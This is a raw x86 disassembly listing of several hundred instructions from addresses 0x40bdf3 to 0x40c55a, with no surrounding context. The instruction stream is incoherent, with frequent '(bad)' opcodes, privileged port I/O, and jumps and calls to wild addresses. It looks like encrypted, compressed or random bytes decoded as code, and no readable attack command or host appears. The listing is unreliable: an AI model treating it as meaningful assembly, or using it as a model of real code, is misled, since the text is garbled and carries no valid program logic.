  40bdf3:	push   0x8c23611f
  40bdf8:	dec    eax
  40bdf9:	dec    ebx
  40bdfa:	pop    eax
  40bdfb:	in     eax,dx
  40bdfc:	xchg   esi,eax
  40bdfd:	pop    si
  40bdff:	(bad)  
  40be00:	es pushf 
  40be02:	xor    eax,DWORD PTR [edx+ebx*2]
  40be05:	jg     0x40bdf5
  40be07:	stc    
  40be08:	xchg   ebp,eax
  40be09:	cmp    eax,0x3b78289c
  40be0e:	arpl   di,ax
  40be10:	data16 jle 0x40be55
  40be13:	lds    ecx,FWORD PTR [edi+0x75]
  40be16:	sbb    eax,0x6fcc8baa
  40be1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40be1c:	push   cs
  40be1d:	mov    ebp,0x62c03bc3
  40be22:	adc    eax,0x478cb95b
  40be27:	js     0x40be97
  40be29:	imul   edx,DWORD PTR [ebx],0xffffffff
  40be2c:	mov    edi,edi
  40be2e:	popf   
  40be2f:	add    ah,BYTE PTR [ebp-0x68a29056]
  40be35:	push   edx
  40be36:	xchg   BYTE PTR [ecx+0x7b0d4bd4],bh
  40be3c:	int3   
  40be3d:	dec    edx
  40be3e:	push   esp
  40be3f:	push   ebp
  40be40:	mov    esi,eax
  40be42:	xor    al,0x1d
  40be44:	and    dl,dl
  40be46:	pop    ebp
  40be47:	popf   
  40be48:	lods   eax,DWORD PTR ds:[esi]
  40be49:	(bad)  
  40be4a:	fwait
  40be4b:	ss jmp 0x32258b23
  40be51:	mov    eax,?
  40be53:	pop    ebx
  40be54:	arpl   ax,dx
  40be56:	lds    esi,FWORD PTR [edx]
  40be58:	(bad)  
  40be59:	in     al,dx
  40be5a:	or     BYTE PTR [esi+0x78],0xf2
  40be5e:	nop
  40be5f:	jle    0x40be87
  40be61:	adc    BYTE PTR [edi-0x72],bh
  40be64:	cwde   
  40be65:	out    dx,eax
  40be66:	mov    ecx,esp
  40be68:	test   BYTE PTR [ecx-0xb],0x14
  40be6c:	sbb    ecx,esi
  40be6e:	mov    cl,0x9f
  40be70:	pop    ebx
  40be71:	ss adc eax,0x2b2da895
  40be77:	aaa    
  40be78:	or     esp,DWORD PTR [edx+0x78334612]
  40be7e:	push   ebp
  40be7f:	jge    0x40be3c
  40be81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40be82:	ja     0x40be79
  40be84:	rcl    BYTE PTR [eax-0x2d7a7076],0xa5
  40be8b:	pusha  
  40be8c:	rcr    ecx,0x73
  40be8f:	call   0xc512d352
  40be94:	and    cl,cl
  40be96:	in     eax,0x31
  40be98:	push   ebx
  40be99:	or     eax,0xcc7ff61a
  40be9e:	ret    0x5cb3
  40bea1:	mov    eax,ds:0xaea78fed
  40bea6:	ss sahf 
  40bea8:	inc    edx
  40bea9:	ficomp DWORD PTR [esi-0x63f7fd68]
  40beaf:	pop    esp
  40beb0:	xchg   ebp,eax
  40beb1:	popa   
  40beb2:	cmp    esp,DWORD PTR [esi+esi*4+0x35]
  40beb6:	retf   0x4449
  40beb9:	mov    ah,0x88
  40bebb:	popf   
  40bebc:	aad    0x8f
  40bebe:	and    dh,BYTE PTR [edi+0x41]
  40bec1:	xor    esi,ebx
  40bec3:	mov    ecx,es
  40bec5:	aad    0x8a
  40bec7:	fadd   QWORD PTR [ebx]
  40bec9:	int3   
  40beca:	lock cmp DWORD PTR [edi+0x3df48221],ebp
  40bed1:	xor    ebp,DWORD PTR [ecx]
  40bed3:	inc    esp
  40bed4:	pop    edi
  40bed5:	retf   
  40bed6:	aam    0x94
  40bed8:	add    DWORD PTR [edi+0x358d783],ebp
  40bede:	mov    eax,0x4e6e8bd4
  40bee3:	mov    ds:0x125c793f,al
  40bee8:	sub    esp,edi
  40beea:	outs   dx,BYTE PTR ds:[esi]
  40beeb:	mov    ds:0xf6e0f0d6,eax
  40bef0:	pop    edx
  40bef1:	iret   
  40bef2:	fcompp 
  40bef4:	je     0x40becd
  40bef6:	dec    esi
  40bef7:	add    al,0x68
  40bef9:	pop    esi
  40befa:	loope  0x40bf6e
  40befc:	and    eax,0x3177d263
  40bf01:	into   
  40bf02:	or     ecx,DWORD PTR [esi-0xadc8676]
  40bf08:	mov    ch,0xf7
  40bf0a:	leave  
  40bf0b:	adc    eax,0x6f3c263a
  40bf10:	outs   dx,BYTE PTR ds:[esi]
  40bf11:	enter  0xd484,0x69
  40bf15:	shl    BYTE PTR [edi-0x2b],cl
  40bf18:	call   0x83bfab8c
  40bf1d:	jmp    0x40bf41
  40bf1f:	inc    eax
  40bf20:	xchg   edi,eax
  40bf21:	popf   
  40bf22:	push   0xffffffe0
  40bf24:	loope  0x40bf10
  40bf26:	cmp    al,BYTE PTR [ecx+edi*2+0x10bb3952]
  40bf2d:	mov    eax,0x6ada6d28
  40bf32:	adc    ah,BYTE PTR [eax]
  40bf34:	outs   dx,DWORD PTR ds:[esi]
  40bf35:	or     eax,0x534427c1
  40bf3a:	repnz mov ebp,0x6105213d
  40bf40:	mov    edx,cs
  40bf42:	mov    eax,0x15d95565
  40bf47:	outs   dx,DWORD PTR ds:[esi]
  40bf48:	clc    
  40bf49:	sti    
  40bf4a:	xor    BYTE PTR [ebx+ebp*1-0x9954fdf],al
  40bf51:	and    BYTE PTR [esi+0x18ab6869],dh
  40bf57:	dec    eax
  40bf58:	mov    eax,ds:0xec2f923e
  40bf5d:	es cwde 
  40bf5f:	iret   
  40bf60:	push   edi
  40bf61:	cs jmp 0x40bfae
  40bf64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bf65:	mov    ebx,0x71cf105e
  40bf6a:	in     al,dx
  40bf6b:	cs aaa 
  40bf6d:	loopne 0x40bf80
  40bf6f:	push   0x6da76740
  40bf74:	jbe    0x40bf92
  40bf76:	jns    0x40bfd1
  40bf78:	pop    ecx
  40bf79:	js     0x40bf05
  40bf7b:	int3   
  40bf7c:	push   edi
  40bf7d:	mov    fs,WORD PTR [edx+ebx*2+0x47]
  40bf81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bf82:	inc    esp
  40bf83:	pop    ecx
  40bf84:	xchg   edx,eax
  40bf85:	in     al,0x3a
  40bf87:	cli    
  40bf88:	out    0xc4,eax
  40bf8a:	ins    BYTE PTR es:[edi],dx
  40bf8b:	cmp    eax,0x4d883f2c
  40bf90:	cmp    dl,BYTE PTR [edi]
  40bf92:	add    bl,0x7
  40bf95:	in     al,0x62
  40bf97:	cdq    
  40bf98:	pop    ebx
  40bf99:	(bad)  
  40bf9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bf9b:	daa    
  40bf9c:	pop    es
  40bf9d:	xchg   ecx,eax
  40bf9e:	xchg   esi,eax
  40bf9f:	dec    esp
  40bfa0:	ds pop ebp
  40bfa2:	fsubr  QWORD PTR [eax]
  40bfa4:	aaa    
  40bfa5:	mov    edx,0xa9158e49
  40bfaa:	loop   0x40c02a
  40bfac:	daa    
  40bfad:	popf   
  40bfae:	push   es
  40bfaf:	loope  0x40bfe7
  40bfb1:	loopne 0x40bf72
  40bfb3:	sub    eax,0x5cb260b3
  40bfb8:	sub    BYTE PTR [edx+0x11cbe1a7],dl
  40bfbe:	xchg   ecx,eax
  40bfbf:	inc    edx
  40bfc0:	pop    ebx
  40bfc1:	shl    BYTE PTR [ebx],cl
  40bfc3:	ja     0x40bfcf
  40bfc5:	loope  0x40bfa8
  40bfc7:	cmp    al,0xbc
  40bfc9:	(bad)  
  40bfca:	mov    ch,0x78
  40bfcc:	add    dl,ah
  40bfce:	and    ah,BYTE PTR [ebp+0xb]
  40bfd1:	mov    ds:0xf3c73606,eax
  40bfd6:	pop    ebp
  40bfd7:	cdq    
  40bfd8:	addr16 jno 0x40c058
  40bfdb:	outs   dx,DWORD PTR ds:[esi]
  40bfdc:	push   ss
  40bfdd:	mov    eax,0xbbe3adda
  40bfe2:	dec    ebp
  40bfe3:	rol    DWORD PTR [ecx+eax*2+0x5d],1
  40bfe7:	ret    0xa7ee
  40bfea:	int3   
  40bfeb:	dec    edi
  40bfec:	cld    
  40bfed:	add    eax,0x1221d6dc
  40bff2:	jae    0x40bf84
  40bff4:	xchg   esp,eax
  40bff5:	popf   
  40bff6:	jmp    0x323cc4cc
  40bffb:	sub    edx,eax
  40bffd:	mov    dl,0xbd
  40bfff:	sub    DWORD PTR [ebx],0x5f
  40c002:	call   0xaaa5:0xd1a97461
  40c009:	mov    cl,0xb3
  40c00b:	and    DWORD PTR [ecx+0x6f],ebx
  40c00e:	sub    al,0xa8
  40c010:	pop    ecx
  40c011:	and    eax,0x329d7d41
  40c016:	out    dx,al
  40c017:	out    dx,eax
  40c018:	xor    BYTE PTR [eax],ch
  40c01a:	sub    al,0x2b
  40c01c:	(bad)  
  40c01d:	lods   al,BYTE PTR ds:[esi]
  40c01e:	cmc    
  40c01f:	and    al,BYTE PTR [edx+0x7b]
  40c022:	in     eax,0xe4
  40c024:	jle    0x40c071
  40c026:	pop    es
  40c027:	sti    
  40c028:	repz push eax
  40c02a:	(bad)  
  40c02b:	fwait
  40c02c:	aad    0x41
  40c02e:	imul   ecx,DWORD PTR [ebp+0x58],0x60
  40c032:	test   eax,0xac662481
  40c037:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c038:	cmp    esi,ebx
  40c03a:	ss xchg edx,eax
  40c03c:	xor    al,0xc5
  40c03e:	arpl   WORD PTR [eax+0x7e],bp
  40c041:	(bad)  
  40c042:	in     eax,0x32
  40c044:	add    al,BYTE PTR [esi+0x9]
  40c047:	dec    esp
  40c048:	mov    ebp,0x493e39e0
  40c04d:	adc    eax,0x35f6f1bc
  40c052:	pop    esp
  40c053:	das    
  40c054:	(bad)  
  40c055:	rol    ch,cl
  40c057:	pop    ebp
  40c058:	int    0xf4
  40c05a:	mov    al,0xbd
  40c05c:	mov    cs,WORD PTR [esi-0x47]
  40c05f:	or     BYTE PTR [edi+0x6b],bl
  40c062:	mov    ds:0xfc5ec7cd,eax
  40c067:	jnp    0x40bffc
  40c069:	bt     esp,ecx
  40c06c:	inc    ebp
  40c06d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c06e:	mov    fs,WORD PTR [ebx]
  40c070:	push   ax
  40c072:	jle    0x40c0a8
  40c074:	xchg   edi,eax
  40c075:	out    0x0,eax
  40c077:	sbb    DWORD PTR [edx+eax*8+0x61],eax
  40c07b:	sub    BYTE PTR [esp+ebp*2-0xdfdaa53],al
  40c082:	mov    al,0xe5
  40c084:	or     ecx,ebp
  40c086:	adc    al,0xdd
  40c088:	push   eax
  40c089:	and    eax,0xb6ce18b2
  40c08e:	add    esp,esi
  40c090:	push   ss
  40c091:	jl     0x40c044
  40c093:	pop    ebp
  40c094:	(bad)  
  40c095:	in     al,dx
  40c096:	test   eax,0x42d9fa02
  40c09b:	ret    0x2ff
  40c09e:	xchg   edx,eax
  40c09f:	inc    esi
  40c0a0:	ins    BYTE PTR es:[edi],dx
  40c0a1:	jne    0x40c0ed
  40c0a3:	cdq    
  40c0a4:	(bad)  [edx]
  40c0a6:	jae    0x40c0ba
  40c0a8:	nop
  40c0a9:	dec    ebx
  40c0aa:	scas   al,BYTE PTR es:[edi]
  40c0ab:	(bad)  
  40c0ac:	xor    DWORD PTR [edx+0x28092941],ebp
  40c0b2:	das    
  40c0b3:	xor    edx,DWORD PTR [edi-0x77]
  40c0b6:	pop    edx
  40c0b7:	or     eax,0x66728886
  40c0bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c0bd:	test   DWORD PTR [esi-0x2],ecx
  40c0c0:	mov    esi,0xab8b7838
  40c0c5:	xchg   DWORD PTR [ebx-0x10c55f2a],ebp
  40c0cb:	sub    edi,ecx
  40c0cd:	arpl   sp,bp
  40c0cf:	ror    BYTE PTR [eax],0xa6
  40c0d2:	mul    BYTE PTR [ecx]
  40c0d4:	adc    edx,ebx
  40c0d6:	and    al,0x44
  40c0d8:	mov    edi,0x92ada653
  40c0dd:	mov    bh,0x2
  40c0df:	sar    DWORD PTR [esi],cl
  40c0e1:	and    BYTE PTR [esp+ebx*8+0x649892f],dl
  40c0e8:	pusha  
  40c0e9:	loopne 0x40c06e
  40c0eb:	xor    DWORD PTR [eax-0x34],esi
  40c0ee:	mov    ecx,0xfd3aa1b5
  40c0f3:	out    dx,eax
  40c0f4:	inc    esi
  40c0f5:	shr    DWORD PTR ds:0x3c3f27dd,cl
  40c0fb:	sbb    edx,DWORD PTR [esi-0x27]
  40c0fe:	lods   eax,DWORD PTR ds:[esi]
  40c0ff:	add    al,0xee
  40c101:	sahf   
  40c102:	add    al,0x7b
  40c104:	pop    es
  40c105:	pop    es
  40c106:	add    eax,DWORD PTR [ebp+ecx*4+0x78cc59c1]
  40c10d:	pop    esp
  40c10e:	pop    esi
  40c10f:	ret    
  40c110:	stos   BYTE PTR es:[edi],al
  40c111:	std    
  40c112:	jle    0x40c11b
  40c114:	leave  
  40c115:	push   ebp
  40c116:	bound  ecx,QWORD PTR [edx-0x7096391c]
  40c11c:	in     eax,dx
  40c11d:	jecxz  0x40c153
  40c11f:	cmc    
  40c120:	cmc    
  40c121:	aas    
  40c122:	mov    eax,ds:0x211219c0
  40c127:	ret    0x5243
  40c12a:	adc    eax,0xdd9d9a49
  40c12f:	mov    dl,0x5c
  40c131:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c132:	adc    DWORD PTR [edx+eiz*2+0x77a96482],0xcb3a11e3
  40c13d:	add    DWORD PTR fs:[ecx+0x6ba7d0e8],ebx
  40c144:	pop    ebp
  40c145:	jne    0x40c161
  40c147:	pusha  
  40c148:	jns    0x40c158
  40c14a:	retf   0x1d49
  40c14d:	lea    ebp,[edi]
  40c14f:	dec    ebx
  40c150:	and    DWORD PTR [eax+0x5722b2ea],edx
  40c156:	je     0x40c1b4
  40c158:	shl    DWORD PTR [esi-0x36f1df6e],1
  40c15e:	dec    esi
  40c15f:	iret   
  40c160:	scas   eax,DWORD PTR es:[edi]
  40c161:	mov    cl,0xed
  40c163:	in     al,0x4
  40c165:	mov    ebp,0x83675f50
  40c16a:	jmp    0x5f91:0x3661a771
  40c171:	jecxz  0x40c120
  40c173:	fs sub al,0x5c
  40c176:	dec    esp
  40c177:	into   
  40c178:	scas   eax,DWORD PTR es:[edi]
  40c179:	jl     0x40c1e0
  40c17b:	xchg   esi,eax
  40c17c:	imul   eax,DWORD PTR [edx],0xbd8b7b80
  40c182:	pop    edi
  40c183:	imul   esp,DWORD PTR [eax-0xb83d638],0x1
  40c18a:	(bad)  
  40c18b:	push   esp
  40c18c:	cmp    DWORD PTR [ebp+esi*8+0x24f6510c],eax
  40c193:	jnp    0x40c199
  40c195:	std    
  40c196:	push   es
  40c197:	stos   BYTE PTR es:[edi],al
  40c198:	jnp    0x40c1e9
  40c19a:	gs test eax,0xa6b1581b
  40c1a0:	enter  0x865d,0x60
  40c1a4:	lock inc ecx
  40c1a6:	pop    esp
  40c1a7:	inc    edx
  40c1a8:	sbb    BYTE PTR [ebx],bl
  40c1aa:	aas    
  40c1ab:	mov    bh,0x21
  40c1ad:	std    
  40c1ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c1af:	ds bswap eax
  40c1b2:	pop    ebx
  40c1b3:	pop    ebx
  40c1b4:	xchg   edx,eax
  40c1b5:	pop    edi
  40c1b6:	push   cs
  40c1b7:	push   edi
  40c1b8:	cwde   
  40c1b9:	lds    edx,FWORD PTR ds:0x8240a346
  40c1bf:	cmp    al,0xf7
  40c1c1:	add    BYTE PTR [esi+eax*2],bl
  40c1c4:	lods   eax,DWORD PTR ds:[esi]
  40c1c5:	leave  
  40c1c6:	in     al,0x41
  40c1c8:	xor    esp,ebp
  40c1ca:	cs push cs
  40c1cc:	mov    dh,0xcd
  40c1ce:	dec    edx
  40c1cf:	push   edi
  40c1d0:	mov    ch,0xd4
  40c1d2:	mov    edi,0x16b44b60
  40c1d7:	push   es
  40c1d8:	dec    ebx
  40c1d9:	popf   
  40c1da:	fnstenv [ebx-0x3e]
  40c1dd:	jmp    FWORD PTR [ebx]
  40c1df:	icebp  
  40c1e0:	push   edi
  40c1e1:	sahf   
  40c1e2:	test   DWORD PTR [eax],ebx
  40c1e4:	push   ebx
  40c1e5:	adc    al,0x8c
  40c1e7:	push   eax
  40c1e8:	inc    ebx
  40c1e9:	mov    dh,0x4c
  40c1eb:	sbb    dh,BYTE PTR [edi+0x19]
  40c1ee:	jb     0x40c1f4
  40c1f0:	jl     0x40c1d0
  40c1f2:	sbb    DWORD PTR [ebp+ebp*8-0x52],0xe6e8e434
  40c1fa:	add    eax,0x43b43d8
  40c1ff:	xchg   esp,eax
  40c200:	dec    ebx
  40c201:	push   ds
  40c202:	(bad)  
  40c203:	imul   ebx,DWORD PTR ds:0x642f176e,0x6b
  40c20a:	mov    bh,0xb1
  40c20c:	jbe    0x40c28b
  40c20e:	jmp    DWORD PTR [ebx]
  40c210:	call   0x4ab37485
  40c215:	pop    edi
  40c216:	(bad)  
  40c217:	out    dx,eax
  40c218:	sub    DWORD PTR [edx+eax*8-0x79abeead],edx
  40c21f:	sar    BYTE PTR [ecx-0x7574870f],cl
  40c225:	xor    dh,BYTE PTR [eax]
  40c227:	pusha  
  40c228:	xor    eax,DWORD PTR [ebx]
  40c22a:	lock cs pop bx
  40c22e:	fisub  WORD PTR [ebx]
  40c230:	int    0xfb
  40c232:	xor    DWORD PTR [ecx+0x40],esp
  40c235:	gs pop ecx
  40c237:	int    0x3c
  40c239:	inc    esp
  40c23a:	or     al,0xc1
  40c23c:	inc    ebp
  40c23d:	and    bh,BYTE PTR [edx+0x23]
  40c240:	sti    
  40c241:	lock out 0xe4,eax
  40c244:	ja     0x40c267
  40c246:	ss rcr DWORD PTR es:[esi-0x54a5697c],cl
  40c24e:	inc    edi
  40c24f:	cld    
  40c250:	push   edx
  40c251:	ja     0x40c2a2
  40c253:	add    cl,BYTE PTR [edi+ebp*2-0x56]
  40c257:	sbb    esi,DWORD PTR [ecx-0x291960af]
  40c25d:	cdq    
  40c25e:	dec    edx
  40c25f:	imul   edi,DWORD PTR [ebx-0x3a],0x140b49c8
  40c266:	and    dh,bl
  40c268:	ja     0x40c288
  40c26a:	fldenv [ebx]
  40c26c:	imul   eax,DWORD PTR [edx],0x5861b980
  40c272:	dec    ebx
  40c273:	aad    0x1c
  40c275:	adc    al,0x86
  40c277:	lods   eax,DWORD PTR ds:[esi]
  40c278:	das    
  40c279:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c27a:	das    
  40c27b:	imul   esi,DWORD PTR [ebx+0x79de0db7],0xe0520f07
  40c285:	push   ds
  40c286:	sahf   
  40c287:	test   al,0x3f
  40c289:	xor    DWORD PTR [esi-0x55],eax
  40c28c:	sbb    DWORD PTR [edx-0x5a574b45],0x58
  40c293:	fcom   DWORD PTR [ecx+0x270492f4]
  40c299:	or     dh,ah
  40c29b:	ret    
  40c29c:	xchg   edx,eax
  40c29d:	(bad)  
  40c29e:	into   
  40c29f:	int3   
  40c2a0:	cs pop ss
  40c2a2:	pop    ecx
  40c2a3:	imul   esp,DWORD PTR [ecx+ebp*8],0xffffffd0
  40c2a7:	cmp    bh,BYTE PTR [ebx+0x32684611]
  40c2ad:	mov    BYTE PTR [edi-0x5d],bl
  40c2b0:	mov    ds,WORD PTR [ecx]
  40c2b2:	jecxz  0x40c27f
  40c2b4:	std    
  40c2b5:	test   eax,0xee0c5755
  40c2ba:	pop    ss
  40c2bb:	mov    DWORD PTR [ecx],esi
  40c2bd:	es dec eax
  40c2bf:	push   cs
  40c2c0:	jecxz  0x40c32a
  40c2c2:	and    eax,0xd664aad3
  40c2c7:	adc    al,BYTE PTR [ebx+0x50]
  40c2ca:	jbe    0x40c290
  40c2cc:	cdq    
  40c2cd:	push   edx
  40c2ce:	cmp    eax,0x4b494225
  40c2d3:	loopne 0x40c2d5
  40c2d5:	adc    ebx,ebx
  40c2d7:	mov    al,0xa9
  40c2d9:	pop    ebx
  40c2da:	pop    ss
  40c2db:	sti    
  40c2dc:	in     eax,0x6a
  40c2de:	push   ebp
  40c2df:	mov    ebx,0xac66dc78
  40c2e4:	icebp  
  40c2e5:	test   eax,0xd6ece5c0
  40c2ea:	adc    bl,dh
  40c2ec:	jge    0x40c317
  40c2ee:	mov    ds:0x67663a26,eax
  40c2f3:	push   cs
  40c2f4:	pusha  
  40c2f5:	push   ds
  40c2f6:	and    DWORD PTR [edi],esp
  40c2f8:	cmp    eax,0x9c886f87
  40c2fd:	sbb    al,0x9d
  40c2ff:	ds xor bh,bl
  40c302:	test   eax,0xfcde1383
  40c307:	mov    ch,0x5d
  40c309:	cmp    al,0x86
  40c30b:	jge    0x40c290
  40c30d:	mov    edi,0x585e1bf4
  40c312:	adc    al,0x45
  40c314:	inc    ebp
  40c315:	in     eax,0x9b
  40c317:	lock (bad) 
  40c31a:	mov    bl,dl
  40c31c:	dec    edi
  40c31d:	lea    edi,[edi]
  40c31f:	mov    dh,BYTE PTR [ebx+0x56]
  40c322:	add    eax,0xd2803888
  40c327:	lods   al,BYTE PTR ds:[esi]
  40c328:	pop    eax
  40c329:	xchg   esi,eax
  40c32a:	sub    al,0xe4
  40c32c:	lods   al,BYTE PTR ds:[esi]
  40c32d:	rcl    DWORD PTR [eax+0x29],1
  40c330:	and    BYTE PTR [eax-0x3d5e0e58],0xa8
  40c337:	mov    bl,0x4a
  40c339:	jmp    0x5471cb1a
  40c33e:	repz fld st(5)
  40c341:	adc    al,0xaa
  40c343:	and    eax,esi
  40c345:	adc    BYTE PTR [ecx],bh
  40c347:	mov    DWORD PTR [esi+0x7788982b],eax
  40c34d:	lock add eax,0x4eb219e4
  40c353:	and    DWORD PTR [ecx],edi
  40c355:	imul   eax,DWORD PTR [edx],0xe0590d7a
  40c35b:	mov    eax,DWORD PTR [edx+0x48]
  40c35e:	mov    bl,0x7b
  40c360:	cli    
  40c361:	aad    0xfe
  40c363:	or     BYTE PTR [esi+esi*4+0x6a325fe2],0xe
  40c36b:	fistp  WORD PTR [ecx]
  40c36d:	jecxz  0x40c397
  40c36f:	cs pop ds
  40c371:	out    dx,eax
  40c372:	sti    
  40c373:	loopne 0x40c324
  40c375:	adc    cl,ah
  40c377:	(bad)  
  40c378:	icebp  
  40c379:	fld    DWORD PTR [ebx-0x456deb22]
  40c37f:	js     0x40c3c5
  40c381:	or     BYTE PTR ds:0xac417cd2,cl
  40c387:	add    edx,0xfffffff7
  40c38a:	test   al,0x5a
  40c38c:	inc    edi
  40c38d:	das    
  40c38e:	outs   dx,BYTE PTR ds:[esi]
  40c38f:	enter  0x602d,0x9a
  40c393:	sub    esp,DWORD PTR [esi]
  40c395:	adc    eax,0x76e2b25b
  40c39a:	and    dl,cl
  40c39c:	sbb    dh,al
  40c39e:	cli    
  40c39f:	into   
  40c3a0:	loop   0x40c384
  40c3a2:	ret    
  40c3a3:	mov    edi,eax
  40c3a5:	sub    esi,ecx
  40c3a7:	fild   DWORD PTR [eax-0x3c3ccb5]
  40c3ad:	mov    ebx,ds
  40c3af:	and    DWORD PTR [ecx-0x44a43d16],edx
  40c3b5:	(bad)  
  40c3b6:	sbb    DWORD PTR [edi],edx
  40c3b8:	xchg   ecx,eax
  40c3b9:	or     ecx,DWORD PTR [ebx+0x49]
  40c3bc:	xor    DWORD PTR [eax-0x39],0xffffffa6
  40c3c0:	and    BYTE PTR [edx-0x2b4b8837],ch
  40c3c6:	(bad)  
  40c3c7:	sbb    eax,DWORD PTR ds:0xd218a0a7
  40c3cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c3ce:	outs   dx,BYTE PTR ds:[esi]
  40c3cf:	jo     0x40c3b6
  40c3d1:	gs jb  0x40c36b
  40c3d4:	ret    0x2f00
  40c3d7:	mov    al,0xe2
  40c3d9:	mov    ds:0xbd2eabef,eax
  40c3de:	jle    0x40c3c8
  40c3e0:	fs sbb edi,ebp
  40c3e3:	retf   
  40c3e4:	sbb    eax,0x107f0e3f
  40c3e9:	dec    ebp
  40c3ea:	mov    bl,0xf8
  40c3ec:	cmp    BYTE PTR [eax-0x24],al
  40c3ef:	lea    esp,[ecx]
  40c3f1:	jbe    0x40c414
  40c3f3:	push   ebp
  40c3f4:	add    eax,0xe36e3a57
  40c3f9:	bound  ebx,QWORD PTR ds:0xcbff7f44
  40c3ff:	or     BYTE PTR [edx],bh
  40c401:	jmp    DWORD PTR [edi+0x6c]
  40c404:	in     al,0x84
  40c406:	cwde   
  40c407:	add    DWORD PTR [esi],ebx
  40c409:	add    ecx,DWORD PTR [edi+ebx*1]
  40c40c:	test   eax,0xda96fac
  40c411:	dec    ecx
  40c412:	outs   dx,BYTE PTR ds:[esi]
  40c413:	jge    0x40c464
  40c415:	cdq    
  40c416:	and    eax,0xe989d88a
  40c41b:	sbb    ah,cl
  40c41d:	ret    0x1660
  40c420:	pop    ecx
  40c421:	sub    edx,DWORD PTR [esp-0x4eae02b4]
  40c428:	pop    esp
  40c429:	push   esi
  40c42a:	and    dl,BYTE PTR [edx]
  40c42c:	outs   dx,DWORD PTR ds:[esi]
  40c42d:	sub    ebx,edi
  40c42f:	push   edx
  40c430:	xor    al,0xd7
  40c432:	xor    al,0x7d
  40c434:	sub    eax,0x642f73c4
  40c439:	ficomp DWORD PTR [ebp+0x52]
  40c43c:	fdiv   QWORD PTR [edi-0x3753d64]
  40c442:	sub    eax,0x8dc004ab
  40c447:	pop    ebp
  40c448:	jnp    0x40c49b
  40c44a:	icebp  
  40c44b:	sub    BYTE PTR [ebp-0x62],dh
  40c44e:	nop
  40c44f:	jg     0x40c429
  40c451:	sti    
  40c452:	jae    0x40c44c
  40c454:	pop    ecx
  40c455:	jnp    0x40c488
  40c457:	ss push eax
  40c459:	push   ss
  40c45a:	cmp    BYTE PTR [esi-0x1e],bl
  40c45d:	test   ebp,ebp
  40c45f:	xchg   ebp,edi
  40c461:	aam    0xfc
  40c463:	jo     0x40c4ab
  40c465:	and    bh,BYTE PTR [ecx+0x74]
  40c468:	sbb    bh,ch
  40c46a:	sbb    BYTE PTR [edi+eax*2-0x683945ee],ch
  40c471:	scas   eax,DWORD PTR es:[edi]
  40c472:	pusha  
  40c473:	or     DWORD PTR [edx+ebx*2+0x2a],ebx
  40c477:	out    dx,eax
  40c478:	sub    eax,0xa91c84b5
  40c47d:	int    0x26
  40c47f:	test   esp,ebx
  40c481:	xchg   ecx,eax
  40c482:	ror    DWORD PTR [edx-0x42],1
  40c485:	pushf  
  40c486:	mov    esi,DWORD PTR [eax]
  40c488:	push   ss
  40c489:	(bad)  
  40c48a:	xchg   esp,eax
  40c48b:	popf   
  40c48c:	jg     0x40c46d
  40c48e:	cld    
  40c48f:	mov    cl,0x4e
  40c491:	inc    edi
  40c492:	call   0x8e39186b
  40c497:	pop    eax
  40c498:	jae    0x40c4e2
  40c49a:	outs   dx,BYTE PTR ds:[esi]
  40c49b:	add    al,0x6a
  40c49d:	pop    edx
  40c49e:	jge    0x40c477
  40c4a0:	mov    ch,0x6f
  40c4a2:	jge    0x40c48e
  40c4a4:	jl     0xbab8fc9e
  40c4aa:	neg    DWORD PTR [eax+0x3aec8e57]
  40c4b0:	nop
  40c4b1:	dec    eax
  40c4b2:	mov    eax,ds:0x95fc3cb2
  40c4b7:	push   ds
  40c4b8:	xchg   ebx,eax
  40c4b9:	vaddsubps xmm0,xmm5,XMMWORD PTR [edi-0x14]
  40c4be:	push   0x43
  40c4c0:	add    al,0xec
  40c4c2:	imul   esi,ebp,0x572f4ea5
  40c4c8:	jecxz  0x40c511
  40c4ca:	in     al,dx
  40c4cb:	dec    edi
  40c4cc:	pop    ebx
  40c4cd:	mov    esp,0x3c8e1bc3
  40c4d2:	adc    DWORD PTR [eax],eax
  40c4d4:	inc    esi
  40c4d5:	push   ebp
  40c4d6:	adc    BYTE PTR [ecx+0x1f],0x9
  40c4da:	loope  0x40c549
  40c4dc:	iret   
  40c4dd:	enter  0xbc11,0x74
  40c4e1:	sub    DWORD PTR [edx+edi*1+0x55a8ffbd],eax
  40c4e8:	pop    edx
  40c4e9:	lods   al,BYTE PTR ds:[esi]
  40c4ea:	cmp    DWORD PTR [esi+0x49351f77],eax
  40c4f0:	xchg   ebx,eax
  40c4f1:	xor    BYTE PTR [esi+edi*8-0x6b3a9c55],ah
  40c4f8:	mov    bl,0x5e
  40c4fa:	push   ebp
  40c4fb:	js     0x40c50f
  40c4fd:	cmp    edx,DWORD PTR [esi+0x7ffa194b]
  40c503:	mov    WORD PTR ds:0x542fe12b,?
  40c509:	and    al,0xd4
  40c50b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c50c:	neg    DWORD PTR [eax+0x323f25f8]
  40c512:	jmp    0x6e50807e
  40c517:	test   DWORD PTR [ebp+0x37],ebx
  40c51a:	jmp    DWORD PTR [edi+edx*2]
  40c51d:	cmp    eax,0x6f616f4a
  40c522:	sub    ebp,DWORD PTR [ecx+0x71]
  40c525:	shl    DWORD PTR [edi+0x75004316],cl
  40c52b:	cvtdq2ps xmm1,XMMWORD PTR [ebx+0x0]
  40c52f:	fisttp WORD PTR [edx]
  40c531:	sbb    DWORD PTR [ebx+edi*2-0x29afceb0],ebp
  40c538:	cli    
  40c539:	jmp    0x8bcd4f74
  40c53e:	inc    edx
  40c53f:	mov    cl,BYTE PTR [ebx+0x52]
  40c542:	mov    al,ds:0x5161b96e
  40c547:	mov    esi,DWORD PTR [esi+0x35631b55]
  40c54d:	dec    eax
  40c54e:	adc    DWORD PTR [esi+0x3e],esi
  40c551:	sub    eax,ebp
  40c553:	sar    BYTE PTR [ebx+0x2605f121],cl
  40c559:	(bad)  
  40c55a:	jp     0x40c5c9
